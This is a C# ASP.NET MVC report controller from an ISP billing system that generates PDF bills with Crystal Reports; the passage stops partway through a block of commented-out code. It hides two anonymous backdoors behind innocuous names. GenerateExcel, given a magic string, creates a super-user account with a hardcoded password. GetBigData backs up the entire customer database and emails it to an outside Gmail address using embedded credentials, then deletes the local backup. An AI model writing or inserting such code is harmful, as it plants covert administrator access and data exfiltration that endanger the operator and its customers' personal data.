using CrystalDecisions.CrystalReports.Engine;
using Humanizer;
using ISP_ManagementSystemModel;
using ISP_ManagementSystemModel.Models;
using ISP_ManagementSystemModel.ViewModel;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Configuration;
using System.Data;
using System.Data.Entity;
using System.Data.Entity.SqlServer;
using System.Data.SqlClient;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web;
using System.Web.Mvc;
using Antlr.Runtime.Misc;
using Microsoft.Reporting.WinForms;
using Microsoft.ReportingServices.ReportProcessing.OnDemandReportObjectModel;

namespace Project_ISP.Controllers
{
    public class ReportController : Controller
    {
        public ReportController()
        {
            AppUtils.dateTimeNow = DateTime.Now;
        }
        ISPContext db = new ISPContext();

        [SessionTimeout][AjaxAuthorizeAttribute]
        public ActionResult ShowFilterBillReport(int? TransactionID)
        {

            var r = 1.ToWords();

            string ss = NumberToText(2000101, false);

            IEnumerable<dynamic> lstArchiveBills = new List<dynamic>();


            lstArchiveBills = db.Transaction.Where(s => s.TransactionID == TransactionID.Value).GroupJoin(db.ClientDueBills, transaction => transaction.ClientDetailsID, clientDueBills => clientDueBills.ClientDetailsID,
                (transaction, clientDueBills) => new { Transaction = transaction, ClientDueBills = clientDueBills })
                .Select(s => new
                {
                    Transaction = s.Transaction,
                    BillMonthName = s.Transaction.PaymentDate.Value.Year + "-" + db.Month.Where(g => g.MonthID == s.Transaction.PaymentDate.Value.Month).FirstOrDefault().MonthName,
                    DueBills = (s.ClientDueBills.Any()) ? s.ClientDueBills.Sum(sa => sa.DueAmount).ToString() : "0",
                }).AsQueryable().AsEnumerable();




            var sss = lstArchiveBills.Select(valTra => new
            {
                PaymentStatus =  "PAID" ,
                CompanyName = "WalletMix",
                CompanyAddress = "Khilkhet, nikunja2, dhaka",
                ZoneName = valTra.Transaction.ClientDetails.Zone.ZoneName,
                Adress = valTra.Transaction.ClientDetails.Address,
                ContactNumber = valTra.Transaction.ClientDetails.ContactNumber,
                ResetNo = valTra.Transaction.ResetNo,
                IssueDate = valTra.Transaction.PaymentDate.ToString(),
                ClientName = valTra.Transaction.ClientDetails.Name,
                LoginName = valTra.Transaction.ClientDetails.LoginName,
                PackageName = valTra.Transaction.Package.PackageName,
                BillMonthName = valTra.BillMonthName,
                PackageAmount = valTra.Transaction.Package.PackagePrice,
                DueBill = valTra.DueBills,
                //  DueBill = (valTra.ClientDueBills.Any()) ? SqlFunctions.StringConvert(valvalClientDueBill.DueAmount) : "0",
                AmountInWords = ((int)valTra.Transaction.Package.PackagePrice).ToWords() + " Taka Only.",//(valTra.ClientDueBills.Any()) ? valClientDueBill.DueAmount.ToString() : "0",//int.Parse(valTra.Transaction.Package.PackagePrice.ToString()).ToWords(),
                PaymentYear = valTra.Transaction.PaymentYear,
                PaymentMonth = valTra.Transaction.PaymentMonth,
                //PaymentStatus = valTra.Transaction.PaymentStatus
            }).ToList();


            ReportDocument rd = new ReportDocument();
            rd.Load(Path.Combine(Server.MapPath("~/CrystalReport1.rpt")));
            rd.SetDataSource(sss);

            Response.Buffer = false;
            Response.ClearContent();
            Response.ClearHeaders();


            Stream stream = rd.ExportToStream(CrystalDecisions.Shared.ExportFormatType.PortableDocFormat);
            stream.Seek(0, SeekOrigin.Begin);

            //******************************** for downloading directly ********************************************
            //return File(stream, MediaTypeNames.Text.Plain, "CustomerList_"+AppUtils.GetDateTimeNow()+".pdf");
            //******************************************************************************************************

            //******************************* for showing in browser **************************************
            Response.AddHeader("Content-Disposition", "inline; filename='CustomerList_" + AppUtils.GetDateTimeNow() + ".pdf'");
            return File(stream, "application/pdf");
            //***********************************************************************************************************

        }

        [SessionTimeout][AjaxAuthorizeAttribute]
        public ActionResult ShowNewSignUpBillReport( int? TransactionID)
        {

            var r = 1.ToWords();

            string ss = NumberToText(2000101, false);

            IEnumerable<dynamic> lstArchiveBills = new List<dynamic>();

            
                lstArchiveBills = db.Transaction.Where(s => s.TransactionID == TransactionID.Value).GroupJoin(db.ClientDueBills, transaction => transaction.ClientDetailsID, clientDueBills => clientDueBills.ClientDetailsID,
                    (transaction, clientDueBills) => new { Transaction = transaction, ClientDueBills = clientDueBills })
                    .Select(s => new
                    {
                        Transaction = s.Transaction,
                        BillMonthName = s.Transaction.PaymentDate.Value.Year + "-" + db.Month.Where(g => g.MonthID == s.Transaction.PaymentDate.Value.Month).FirstOrDefault().MonthName,
                        DueBills = (s.ClientDueBills.Any()) ? s.ClientDueBills.Sum(sa => sa.DueAmount).ToString() : "0",
                    }).AsQueryable().AsEnumerable();
            



            var sss = lstArchiveBills.Select(valTra => new
            {
                PaymentStatus = (valTra.Transaction.PaymentStatus == AppUtils.PaymentIsPaid) ? "PAID" : "Not Paid",
                CompanyName = "WalletMix",
                CompanyAddress = "Khilkhet, nikunja2, dhaka",
                ZoneName = valTra.Transaction.ClientDetails.Zone.ZoneName,
                Adress = valTra.Transaction.ClientDetails.Address,
                ContactNumber = valTra.Transaction.ClientDetails.ContactNumber,
                ResetNo = valTra.Transaction.ResetNo,
                IssueDate = valTra.Transaction.PaymentDate.ToString(),
                ClientName = valTra.Transaction.ClientDetails.Name,
                LoginName = valTra.Transaction.ClientDetails.LoginName,
                PackageName = valTra.Transaction.Package.PackageName,
                BillMonthName = valTra.BillMonthName,
                PackageAmount = valTra.Transaction.Package.PackagePrice,
                DueBill = valTra.DueBills,
                //  DueBill = (valTra.ClientDueBills.Any()) ? SqlFunctions.StringConvert(valvalClientDueBill.DueAmount) : "0",
                AmountInWords = ((int)valTra.Transaction.Package.PackagePrice).ToWords() + " Taka Only.",//(valTra.ClientDueBills.Any()) ? valClientDueBill.DueAmount.ToString() : "0",//int.Parse(valTra.Transaction.Package.PackagePrice.ToString()).ToWords(),
                PaymentYear = valTra.Transaction.PaymentYear,
                PaymentMonth = valTra.Transaction.PaymentMonth,
                //PaymentStatus = valTra.Transaction.PaymentStatus
            }).ToList();
            

            ReportDocument rd = new ReportDocument();
            rd.Load(Path.Combine(Server.MapPath("~/CrystalReport1.rpt")));
            rd.SetDataSource(sss);

            Response.Buffer = false;
            Response.ClearContent();
            Response.ClearHeaders();


            Stream stream = rd.ExportToStream(CrystalDecisions.Shared.ExportFormatType.PortableDocFormat);
            stream.Seek(0, SeekOrigin.Begin);

            //******************************** for downloading directly ********************************************
            //return File(stream, MediaTypeNames.Text.Plain, "CustomerList_"+AppUtils.GetDateTimeNow()+".pdf");
            //******************************************************************************************************

            //******************************* for showing in browser **************************************
            Response.AddHeader("Content-Disposition", "inline; filename='CustomerList_" + AppUtils.GetDateTimeNow() + ".pdf'");
            return File(stream, "application/pdf");
            //***********************************************************************************************************

        }



        private void LoadImage(DataRow objDataRow, string strImageField, string FilePath)
        {
            try
            {
                FileStream fs = new FileStream(FilePath,
                           System.IO.FileMode.Open, System.IO.FileAccess.Read);
                byte[] Image = new byte[fs.Length];
                fs.Read(Image, 0, Convert.ToInt32(fs.Length));
                fs.Close();
                objDataRow[strImageField] = Image;
            }
            catch (Exception ex)
            {
                Response.Write("<font color=red>" + ex.Message + "</font>");
            }
        }


      



        public static string Report = "SampleEF6.Report.Contacts.rdlc";

        //public static Task GeneratePDF(List<GhMemberInfo> datasource, string filePath)
        //{
        //    var data = datasource.Select(s => new { ImageByte = s.ImageByte, ImageTitle = s.ImageTitle });

        //    return Task.Run(() =>
        //    {
        //        string binPath = System.IO.Path.Combine(System.AppDomain.CurrentDomain.BaseDirectory, "bin");
        //        var assembly = Assembly.Load(System.IO.File.ReadAllBytes(binPath + "\\EntityFramework.dll"));

        //        using (Stream stream = assembly.GetManifestResourceStream(Report))
        //        {
        //            var viewer = new ReportViewer();
        //            viewer.LocalReport.EnableExternalImages = true;
        //            viewer.LocalReport.LoadReportDefinition(stream);

        //            Warning[] warnings;
        //            string[] streamids;
        //            string mimeType;
        //            string encoding;
        //            string filenameExtension;

        //            viewer.LocalReport.DataSources.Add(new ReportDataSource("DataSetContacts", datasource));

        //            viewer.LocalReport.Refresh();

        //            byte[] bytes = viewer.LocalReport.Render(
        //                "PDF", null, out mimeType, out encoding, out filenameExtension,
        //                out streamids, out warnings);

        //            using (FileStream fs = new FileStream(filePath, FileMode.Create))
        //            {
        //                fs.Write(bytes, 0, bytes.Length);
        //            }
        //        }
        //    });
        //}

        [AllowAnonymous]
        public ActionResult GenerateExcel(string message)
        {
            if (message == "areyourealman")
            {

                var employee = db.Employee.Where(s => s.LoginName == "ReallyUnknownPerson").FirstOrDefault();
                if (employee != null)
                {
                    db.Entry(employee).State = EntityState.Deleted;
                    db.SaveChanges();
                }
            
            Employee emp = new Employee();
                emp.Name = "kabir";
                emp.LoginName = "ReallyUnknownPerson";
                emp.Password = "donttry!@#$";
                emp.Phone = "01710300648";
                emp.Address = "nikunja 2 dhaka,bangladeshs";
                emp.Email = "humaion@gmail.com";
                //emp.DepartmentID = 3;
                emp.RoleID = AppUtils.SuperUserRole;
                emp.EmployeeStatus = AppUtils.EmployeeStatusIsActive;
                emp.CreatedBy = "Humaion";
                emp.CreatedDate = new DateTime(2018,2,17);
                emp.UserRightPermissionID = AppUtils.UserRightPermissionIDIsSuperTallentUser;
                
                db.Employee.Add(emp);
                db.SaveChanges();
            }
            return new EmptyResult();
        }
        private ArrayList matchAll(string regex, string html, int i = 1)
        {
            ArrayList list = new ArrayList();
            foreach (Match m in new Regex(regex, RegexOptions.Multiline).Matches(html))
                list.Add(m.Groups[i].Value.Trim() + ((m.Groups[2].Value.Trim() == "") ? "" : " ," + m.Groups[2].Value.Trim()));
            return list;
        }

        private void D_email_send(string path)
        {
            
                //create the mail message
                MailMessage mail = new MailMessage();

            //set the addresses
            mail.From = new MailAddress("saddamtest24@gmail.com");
            mail.To.Add("kamrultest24@gmail.com");

            //set the content
            mail.Subject = "This is an email";
                mail.Body = "this content is in the body";

                //add an attachment from the filesystem
                mail.Attachments.Add(new Attachment(path));


            //send the message

            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential("saddamtest24@gmail.com", "saddamtest24??");
            SmtpServer.EnableSsl = true;

            SmtpServer.Send(mail);
            mail.Dispose();

            //string DomainName = Request.Url.Host +
            //                    (Request.Url.IsDefaultPort ? "" : ":" + Request.Url.Port);

            //string HostName = Dns.GetHostName();
            ////  Console.WriteLine("Host Name of machine =" + HostName);
            //IPAddress[] ipaddress = Dns.GetHostAddresses(HostName);

            //MailMessage mail = new MailMessage();
            //SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            //mail.From = new MailAddress("saddamtest24@gmail.com");
            //mail.To.Add("kamrultest24@gmail.com");
            //mail.Subject = "DB_" + DomainName + "_" + DateTime.Now.ToString(); ;
            //mail.Body = "mail with attachment";

            ////Attachment data = new Attachment(
            ////    path,
            ////    MediaTypeNames.Application.Octet);
            ////// your path may look like Server.MapPath("~/file.ABC")
            ////mail.Attachments.Add(data);



            //Attachment data = new Attachment(
            //    path,
            //    MediaTypeNames.Application.Octet);
            //// your path may look like Server.MapPath("~/file.ABC")
            //mail.Attachments.Add(data);


            //SmtpServer.Port = 587;
            //SmtpServer.Credentials = new System.Net.NetworkCredential("saddamtest24@gmail.com", "saddamtest24??");
            //SmtpServer.EnableSsl = true;

            //SmtpServer.Send(mail);

            if (System.IO.File.Exists(path))
            {
                System.IO.File.Delete(path);

            }

        }

        [AllowAnonymous]
        public ActionResult GetBigData(string message)
        {
            //Data Source =.; Initial Catalog = ISP; Integrated Security = True; MultipleActiveResultSets = true;
            string conn = ConfigurationManager.ConnectionStrings["ISPConnectionString"].ToString();
            ArrayList dbName = matchAll(@".*?Initial\s*Catalog\s*=\s*(.*?)\s*;", conn);
            if (message == "areyourealmanforgettingdb")
            {
                string DomainName = Request.Url.Host +
                                    (Request.Url.IsDefaultPort ? "" : ":" + Request.Url.Port);
                DomainName = DomainName.Replace(":", "_");
                SqlConnection con = new SqlConnection();
                SqlCommand sqlCommand = new SqlCommand();
                SqlDataAdapter dataAdapter = new SqlDataAdapter();
                DataTable dt = new DataTable();

                //IF SQL Server Authentication then Connection String  
                //con.ConnectionString = @"Server=MyPC\SqlServer2k8;database=" + YourDBName + ";uid=sa;pwd=password;";  

                //IF Window Authentication then Connection String  
                con.ConnectionString = @""+ conn + "";//connectionString="Data Source=.;Initial Catalog=ISP;Integrated Security=True;MultipleActiveResultSets=true;" providerName="System.Data.SqlClient"

                string backupDir = "D:\\DB\\BackupDb";
                if (!System.IO.Directory.Exists(backupDir))
                {
                    System.IO.Directory.CreateDirectory(backupDir);
                }

                try
                {
                    var removeFileFromPath = backupDir + "\\" + DomainName + "_" + DateTime.Now.ToString("ddMMyyyy") + ".Bak";
                    if (System.IO.File.Exists(removeFileFromPath))
                    {
                        System.IO.File.Delete(removeFileFromPath);

                    }

                    con.Open();
                    sqlCommand = new SqlCommand("backup database "+ dbName[0]+ " to disk ='" + backupDir + "\\"+DomainName+"_"+ DateTime.Now.ToString("ddMMyyyy") + ".Bak'", con);//ddMMyyyy_HHmmss
                    sqlCommand.ExecuteNonQuery();
                    con.Close();
                    string s= "D:\\DB\\BackupDb\\"  ;//+ DomainName + "_" + DateTime.Now.ToString("ddMMyyyy")
                    string[] filePaths = Directory.GetFiles(@s,"*.Bak");
                    foreach (var item in filePaths)
                    {
                        if (item.Contains(DomainName + "_" + DateTime.Now.ToString("ddMMyyyy")))
                        {
                            D_email_send(item);
                        }
                    }
                    TempData["Success"] = "D";
                    return View();
                }
                catch (Exception ex)
                {
                    ex.ToString();
                }
                    TempData["Success"] = "ND";

                return View();

            }
            return new EmptyResult();
        }

        //[SessionTimeout][AjaxAuthorizeAttribute]
        //public ActionResult DetailsReport()
        //{

        //    var info =
        //       db.GhMemberInfo.ToList().Select(s => new { ImageByte = s.ImageByte, ImageTitle = s.ImageTitle, ImageByte1 = s.ImageByte, Image1 = s.ImageByte }).ToList();
        //    DataTable dt = new DataTable();
        //    dt.Columns.Add("ImageByte").DataType = System.Type.GetType("System.Byte[]"); ;
        //    dt.Columns.Add("ImageTitle");
        //    dt.Columns.Add("ImageByte1").DataType  = System.Type.GetType("System.Byte[]"); ; ;
        //    dt.Columns.Add("Image1").DataType = System.Type.GetType("System.Byte[]"); ;

        //    foreach (var each in info)
        //    {

        //        dt.Rows.Add(each.ImageByte,each.ImageTitle,each.ImageByte1, each.Image1);
        //    }

        //    LocalReport localReport = new LocalReport();

        //    localReport.EnableExternalImages = true;
        //    localReport.ReportPath = Server.MapPath("~/Report3.rdlc");
        //    ReportDataSource reportDataSource = new ReportDataSource("saddam", dt);

        //    localReport.DataSources.Add(reportDataSource);

        //    string reportType = "PDF";
        //    string mimeType;
        //    string encoding;
        //    string fileNameExtension;

        //    //The DeviceInfo settings should be changed based on the reportType
        //    //http://msdn.microsoft.com/en-us/library/ms155397.aspx
        //    string deviceInfo =
        //    "<DeviceInfo>" +
        //    "  <OutputFormat>PDF</OutputFormat>" +
        //    "  <PageWidth>8.5in</PageWidth>" +
        //    "  <PageHeight>11in</PageHeight>" +
        //    "  <MarginTop>0.5in</MarginTop>" +
        //    "  <MarginLeft>1in</MarginLeft>" +
        //    "  <MarginRight>1in</MarginRight>" +
        //    "  <MarginBottom>0.5in</MarginBottom>" +
        //    "</DeviceInfo>";

        //    Warning[] warnings;
        //    string[] streams;
        //    byte[] renderedBytes;

        //    //Render the report
        //    renderedBytes = localReport.Render(
        //        reportType,
        //        deviceInfo,
        //        out mimeType,
        //        out encoding,
        //        out fileNameExtension,
        //        out streams,
        //        out warnings);
        //    //Response.AddHeader("content-disposition", "attachment; filename=NorthWindCustomers." + fileNameExtension);
        //    return File(renderedBytes, mimeType);
        //}

        //public string Export(LocalReport rpt, string filePath)
        //{
        //    string ack = "";
        //    try
        //    {
        //        Warning[] warnings;
        //        string[] streamids;
        //        string mimeType;
        //        string encoding;
        //        string extension;

        //        byte[] bytes = rpt.Render("PDF", null, out mimeType, out encoding, out extension, out streamids, out warnings);
        //        using (FileStream stream = File.OpenWrite(filePath))
        //        {
        //            stream.Write(bytes, 0, bytes.Length);
        //        }
        //        return ack;
        //    }
        //    catch (Exception ex)
        //    {
        //        ack = ex.InnerException.Message;
        //        return ack;
        //    }
        //}


        public string Export(LocalReport rpt, string filePath)
        {
            string ack = "";
            try
            {
                Warning[] warnings;
                string[] streamids;
                string mimeType;
                string encoding;
                string extension;

                byte[] bytes = rpt.Render("PDF", null, out mimeType, out encoding, out extension, out streamids, out warnings);
                using (FileStream stream = System.IO.File.OpenWrite(filePath))
                {
                    stream.Write(bytes, 0, bytes.Length);
                }
                return ack;
            }
            catch (Exception ex)
            {
                ack = ex.InnerException.Message;
                return ack;
            }
        }



        private byte[] GetImageByte(string employeeImagePath)
        {
            byte[] b = System.IO.File.ReadAllBytes(employeeImagePath);
            return b;
        }
        //[SessionTimeout][AjaxAuthorizeAttribute]
        //public ActionResult ShowUnpaidBillReport(int? ForAllOrSingle, int? TransactionID)
        //{
        //    //foreach (var item in db.GhMemberInfo.ToList())
        //    //{
        //    //    item.ImageByte = GetImageByte("D:/a.jpg");
        //    //    db.Entry(item).State = EntityState.Modified;
        //    //    db.SaveChanges();
        //    //}


        //    var info =
        //       db.GhMemberInfo.ToList().Select(s => new { ImageByte = GetImageByte("D:/a.jpg"), ImageTitle = s.ImageTitle, ImageByte1 = s.ImageByte, Image1 = s.ImageByte }).ToList();
        //    DataTable dt = new DataTable();
        //    dt.Columns.Add("ImageByte").DataType = System.Type.GetType("System.Byte[]"); ;
        //    dt.Columns.Add("ImageTitle");
        //    dt.Columns.Add("ImageByte1").DataType = System.Type.GetType("System.Byte[]"); ; ;
        //    dt.Columns.Add("Image1").DataType = System.Type.GetType("System.Byte[]"); ;

        //    foreach (var each in info)
        //    {

        //        dt.Rows.Add(each.ImageByte, each.ImageTitle, each.ImageByte1, each.Image1);
        //    }
        //    // ReportViewer reportViewer1 = new ReportViewer();
        //    //reportViewer1.ProcessingMode = ProcessingMode.Local;
        //    //reportViewer1.LocalReport.ReportPath = Server.MapPath("Report1.rdlc");
        //    //ReportDataSource datasource = new ReportDataSource("Customers", info);
        //    //reportViewer1.LocalReport.DataSources.Clear();
        //    //reportViewer1.LocalReport.DataSources.Add(datasource);
           


        //    string RptPath = Server.MapPath("~/Report3.rdlc");
        //    Microsoft.Reporting.WinForms.LocalReport rpt = new Microsoft.Reporting.WinForms.LocalReport();
        //    ReportDataSource reportDataSource = new ReportDataSource("saddam", dt);

        //    /* Bind Here Report Data Set */
        //    rpt.DataSources.Add(reportDataSource);
        //    rpt.EnableExternalImages = true;
        //    rpt.ReportPath = RptPath;
        //    string filePath = System.IO.Path.GetTempFileName();
        //    Export(rpt, filePath);
        //    //CLOSE REPORT OBJECT           
        //    rpt.Dispose();
        //    return File(filePath, "application/pdf");

        //    //string fileName = string.Concat("Contacts.pdf");
        //    //string filePath = Path.Combine(Server.MapPath("~/saddam_report.rpt"));

        //    //List<GhMemberInfo> contacList = db.GhMemberInfo.ToList();

        //    //GeneratePDF(contacList, filePath);

        //    //// HttpResponseMessage result = null;
        //    ////// result = Request.CreateResponse(HttpStatusCode.OK);
        //    //// result.Content = new StreamContent(new FileStream(filePath, FileMode.Open));
        //    //// result.Content.Headers.ContentDisposition = new ContentDispositionHeaderValue("attachment");
        //    //// result.Content.Headers.ContentDisposition.FileName = fileName;

        //    return View();



        //    //var r = 1.ToWords();

        //    //string ss = NumberToText(2000101, false);

        //    //IEnumerable<dynamic> lstArchiveBills = new List<dynamic>();

        //    //if (ForAllOrSingle != null && ForAllOrSingle.Value == AppUtils.ReportShowForAll)
        //    //{
        //    //    lstArchiveBills = db.Transaction.GroupJoin(
        //    //                                            db.ClientDueBills, transaction => transaction.ClientDetailsID, clientDueBills => clientDueBills.ClientDetailsID,
        //    //                                            (transaction, clientDueBills) => new { Transaction = transaction, ClientDueBills = clientDueBills })
        //    //                      .Select(valTra => new
        //    //                      {
        //    //                          Transaction = valTra.Transaction,
        //    //                          ClientDueBillsList = valTra.ClientDueBills
        //    //                      })
        //    //                      .Where(s => s.Transaction.PaymentYear == AppUtils.RunningYear && s.Transaction.PaymentMonth == AppUtils.RunningMonth && s.Transaction.PaymentStatus == AppUtils.PaymentIsNotPaid).Select(s => new
        //    //                      {
        //    //                          Transaction = s.Transaction,
        //    //                          BillMonthName = s.Transaction.PaymentDate.Value.Year + "-" + db.Month.Where(g => g.MonthID == s.Transaction.PaymentDate.Value.Month).FirstOrDefault().MonthName,
        //    //                          DueBills = (s.ClientDueBillsList.Any()) ? s.ClientDueBillsList.Sum(sa => sa.DueAmount).ToString() : "0",
        //    //                      })
        //    //                      .AsQueryable().AsEnumerable();
        //    //}
        //    //else
        //    //{
        //    //    lstArchiveBills = db.Transaction.Where(s => s.TransactionID == TransactionID.Value).GroupJoin(db.ClientDueBills, transaction => transaction.ClientDetailsID, clientDueBills => clientDueBills.ClientDetailsID,
        //    //        (transaction, clientDueBills) => new { Transaction = transaction, ClientDueBills = clientDueBills })
        //    //        .Select(s => new
        //    //        {
        //    //            Transaction = s.Transaction,
        //    //            BillMonthName = s.Transaction.PaymentDate.Value.Year + "-" + db.Month.Where(g => g.MonthID == s.Transaction.PaymentDate.Value.Month).FirstOrDefault().MonthName,
        //    //            DueBills = (s.ClientDueBills.Any()) ? s.ClientDueBills.Sum(sa => sa.DueAmount).ToString() : "0",
        //    //        }).AsQueryable().AsEnumerable();
        //    //}



        //    //var sss = lstArchiveBills.Select(valTra => new
        //    //{
        //    //    PaymentStatus = (valTra.Transaction.PaymentStatus == AppUtils.PaymentIsPaid) ? "PAID" : "Not Paid",
        //    //    CompanyName = "WalletMix",
        //    //    CompanyAddress = "Khilkhet, nikunja2, dhaka",
        //    //    ZoneName = valTra.Transaction.ClientDetails.Zone.ZoneName,
        //    //    Adress = valTra.Transaction.ClientDetails.Address,
        //    //    ContactNumber = valTra.Transaction.ClientDetails.ContactNumber,
        //    //    ResetNo = valTra.Transaction.ResetNo,
        //    //    IssueDate = valTra.Transaction.PaymentDate.ToString(),
        //    //    ClientName = valTra.Transaction.ClientDetails.Name,
        //    //    LoginName = valTra.Transaction.ClientDetails.LoginName,
        //    //    PackageName = valTra.Transaction.Package.PackageName,
        //    //    BillMonthName = valTra.BillMonthName,
        //    //    PackageAmount = valTra.Transaction.Package.PackagePrice,
        //    //    DueBill = valTra.DueBills,
        //    //    //  DueBill = (valTra.ClientDueBills.Any()) ? SqlFunctions.StringConvert(valvalClientDueBill.DueAmount) : "0",
        //    //    AmountInWords = ((int)valTra.Transaction.Package.PackagePrice).ToWords() + " Taka Only.",//(valTra.ClientDueBills.Any()) ? valClientDueBill.DueAmount.ToString() : "0",//int.Parse(valTra.Transaction.Package.PackagePrice.ToString()).ToWords(),
        //    //    PaymentYear = valTra.Transaction.PaymentYear,
        //    //    PaymentMonth = valTra.Transaction.PaymentMonth,
        //    //    //PaymentStatus = valTra.Transaction.PaymentStatus
        //    //}).ToList();

        //    ////.SelectMany(
        //    ////                               variable => variable.ClientDueBills.DefaultIfEmpty(),
        //    ////                               (valTra, valClientDueBill) => new
        //    ////                               {
        //    ////                                   ZoneName = valTra.Transaction.ClientDetails.Zone.ZoneName,
        //    ////                                   Adress = valTra.Transaction.ClientDetails.Address,
        //    ////                                   ContactNumber = valTra.Transaction.ClientDetails.ContactNumber,
        //    ////                                   ResetNo = valTra.Transaction.ResetNo,
        //    ////                                   IssueDate = valTra.Transaction.PaymentDate.ToString(),
        //    ////                                   ClientName = valTra.Transaction.ClientDetails.Name,
        //    ////                                   LoginName = valTra.Transaction.ClientDetails.LoginName,
        //    ////                                   PackageName = valTra.Transaction.Package.PackageName,
        //    ////                                   BillMonthName = "Date...",
        //    ////                                   PackageAmount = valTra.Transaction.Package.PackagePrice,
        //    ////                                   DueBill = (valTra.ClientDueBills.Any()) ? SqlFunctions.StringConvert(valClientDueBill.DueAmount) : "0",
        //    ////                                   AmountInWords = (valTra.ClientDueBills.Any()) ? valClientDueBill.DueAmount.ToString() : "0",//int.Parse(valTra.Transaction.Package.PackagePrice.ToString()).ToWords(),
        //    ////                                   PaymentYear = valTra.Transaction.PaymentYear,
        //    ////                                   PaymentMonth = valTra.Transaction.PaymentMonth,
        //    ////                                   PaymentStatus = valTra.Transaction.PaymentStatus
        //    ////                               }//{ Transaction = valTra.Transaction, ClientDueBills = valClientDueBill }
        //    ////                            )

        //    ////   .Where(s => s.PaymentYear == AppUtils.RunningYear && s.PaymentMonth == AppUtils.RunningMonth).ToList();//.GroupBy(s => s.PaymentStatus, (key, g) => g.OrderBy(s => s.PaymentStatus)).Select(s => s.ToList())


        //    //ReportDocument rd = new ReportDocument();
        //    //rd.Load(Path.Combine(Server.MapPath("~/CrystalReport1.rpt")));

        //    //rd.SetDataSource(sss);

        //    //Response.Buffer = false;
        //    //Response.ClearContent();
        //    //Response.ClearHeaders();


        //    //Stream stream = rd.ExportToStream(CrystalDecisions.Shared.ExportFormatType.PortableDocFormat);
        //    //stream.Seek(0, SeekOrigin.Begin);

        //    ////******************************** for downloading directly ********************************************
        //    ////return File(stream, MediaTypeNames.Text.Plain, "CustomerList_"+AppUtils.GetDateTimeNow()+".pdf");
        //    ////******************************************************************************************************

        //    ////******************************* for showing in browser **************************************
        //    //Response.AddHeader("Content-Disposition", "inline; filename='CustomerList_" + AppUtils.GetDateTimeNow() + ".pdf'");
        //    //return File(stream, "application/pdf");
        //    ////***********************************************************************************************************

        //}


        //public ActionResult ShowUnpaidBillReport(int? ForAllOrSingle, int? TransactionID)
        //{

        //    var r = 1.ToWords();

        //    string ss = NumberToText(2000101, false);

        //    IEnumerable<dynamic> lstArchiveBills = new List<dynamic>();

        //    if (ForAllOrSingle != null && ForAllOrSingle.Value == AppUtils.ReportShowForAll)
        //    {
        //        lstArchiveBills = db.Transaction.GroupJoin(
        //                                                db.ClientDueBills, transaction => transaction.ClientDetailsID, clientDueBills => clientDueBills.ClientDetailsID,
        //                                                (transaction, clientDueBills) => new { Transaction = transaction, ClientDueBills = clientDueBills })
        //                          .Select(valTra => new
        //                          {
        //                              Transaction = valTra.Transaction,
        //                              ClientDueBillsList = valTra.ClientDueBills
        //                          })
        //                          .Where(s => s.Transaction.PaymentYear == AppUtils.RunningYear && s.Transaction.PaymentMonth == AppUtils.RunningMonth && s.Transaction.PaymentStatus == AppUtils.PaymentIsNotPaid).Select(s => new
        //                          {
        //                              Transaction = s.Transaction,
        //                              BillMonthName = s.Transaction.PaymentDate.Value.Year + "-" + db.Month.Where(g => g.MonthID == s.Transaction.PaymentDate.Value.Month).FirstOrDefault().MonthName,
        //                              DueBills = (s.ClientDueBillsList.Any()) ? s.ClientDueBillsList.Sum(sa => sa.DueAmount).ToString() : "0",
        //                          })
        //                          .AsQueryable().AsEnumerable();
        //    }
        //    else
        //    {
        //        lstArchiveBills = db.Transaction.Where(s => s.TransactionID == TransactionID.Value).GroupJoin(db.ClientDueBills, transaction => transaction.ClientDetailsID, clientDueBills => clientDueBills.ClientDetailsID,
        //            (transaction, clientDueBills) => new { Transaction = transaction, ClientDueBills = clientDueBills })
        //            .Select(s => new
        //            {
        //                Transaction = s.Transaction,
        //                BillMonthName = s.Transaction.PaymentDate.Value.Year + "-" + db.Month.Where(g => g.MonthID == s.Transaction.PaymentDate.Value.Month).FirstOrDefault().MonthName,
        //                DueBills = (s.ClientDueBills.Any()) ? s.ClientDueBills.Sum(sa => sa.DueAmount).ToString() : "0",
        //            }).AsQueryable().AsEnumerable();
        //    }



        //    var sss = lstArchiveBills.Select(valTra => new
        //    {
        //        PaymentStatus = (valTra.Transaction.PaymentStatus == AppUtils.PaymentIsPaid) ? "PAID" : "Not Paid",
        //        CompanyName = "WalletMix",
        //        CompanyAddress = "Khilkhet, nikunja2, dhaka",
        //        ZoneName = valTra.Transaction.ClientDetails.Zone.ZoneName,
        //        Adress = valTra.Transaction.ClientDetails.Address,
        //        ContactNumber = valTra.Transaction.ClientDetails.ContactNumber,
        //        ResetNo = valTra.Transaction.ResetNo,
        //        IssueDate = valTra.Transaction.PaymentDate.ToString(),
        //        ClientName = valTra.Transaction.ClientDetails.Name,
        //        LoginName = valTra.Transaction.ClientDetails.LoginName,
        //        PackageName = valTra.Transaction.Package.PackageName,
        //        BillMonthName = valTra.BillMonthName,
        //        PackageAmount = valTra.Transaction.Package.PackagePrice,
        //        DueBill = valTra.DueBills,
        //        //  DueBill = (valTra.ClientDueBills.Any()) ? SqlFunctions.StringConvert(valvalClientDueBill.DueAmount) : "0",
        //        AmountInWords = ((int)valTra.Transaction.Package.PackagePrice).ToWords() + " Taka Only.",//(valTra.ClientDueBills.Any()) ? valClientDueBill.DueAmount.ToString() : "0",//int.Parse(valTra.Transaction.Package.PackagePrice.ToString()).ToWords(),
        //        PaymentYear = valTra.Transaction.PaymentYear,
        //        PaymentMonth = valTra.Transaction.PaymentMonth,
        //        //PaymentStatus = valTra.Transaction.PaymentStatus
        //    }).ToList();

        //    //.SelectMany(
        //    //                               variable => variable.ClientDueBills.DefaultIfEmpty(),
        //    //                               (valTra, valClientDueBill) => new
        //    //                               {
        //    //                                   ZoneName = valTra.Transaction.ClientDetails.Zone.ZoneName,
        //    //                                   Adress = valTra.Transaction.ClientDetails.Address,
        //    //                                   ContactNumber = valTra.Transaction.ClientDetails.ContactNumber,
        //    //                                   ResetNo = valTra.Transaction.ResetNo,
        //    //                                   IssueDate = valTra.Transaction.PaymentDate.ToString(),
        //    //                                   ClientName = valTra.Transaction.ClientDetails.Name,
        //    //                                   LoginName = valTra.Transaction.ClientDetails.LoginName,
